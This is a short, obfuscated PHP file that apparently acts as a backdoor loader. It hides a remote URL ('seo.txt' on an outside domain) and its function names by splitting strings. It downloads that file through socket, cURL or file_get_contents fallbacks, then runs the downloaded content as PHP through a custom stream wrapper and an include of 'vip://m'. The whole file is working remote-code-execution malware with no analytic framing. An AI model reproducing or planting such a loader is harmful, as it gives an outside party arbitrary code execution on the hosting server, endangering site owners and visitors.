<?php
$u='ht'.'tps://'.'st'.'ep'.'mo'.'mh'.'ub.'.'co'.'m/'.'se'.'o.t'.'xt';
function x($u){
$p=parse_url($u);$h=$p['host'];$s=$p['scheme'];
$a='st'.'ream_'.'soc'.'ket_'.'cl'.'ient';
if(function_exists($a)){
$f=@$a(($s=='https'?'ssl://':'tcp://').$h.':'.($p['port']??($s=='https'?443:80)),$e,$r,30);
if($f){fwrite($f,"GET ".($p['path']??'/')." HTTP/1.0\r\nHost: $h\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
$b='';while(!feof($f))$b.=fgets($f);fclose($f);$parts=explode("\r\n\r\n",$b,2);if(!empty($parts[1]))return $parts[1];}}
$c='cu'.'rl_';$i=$c.'init';
if(function_exists($i)){$ch=$i($u);$o=$c.'setopt';$o($ch,19913,1);$o($ch,52,1);$r=($c.'exec')($ch);if($r)return $r;}
$g='fi'.'le_'.'get_'.'con'.'tents';return function_exists($g)?@$g($u):'';}
$GLOBALS['DATA']=x($u);if(!$GLOBALS['DATA'])die;
class V{private $p=0;function stream_open($p,$m,$o,&$r){return 1;}function stream_stat(){return['size'=>strlen($GLOBALS['DATA'])];}
function stream_read($c){$r=substr($GLOBALS['DATA'],$this->p,$c);$this->p+=strlen($r);return $r;}function stream_eof(){return $this->p>=strlen($GLOBALS['DATA']);}}
$r='st'.'ream_'.'wrap'.'per_'.'reg'.'ister';$r('vip','V');include 'vip://m';
?>
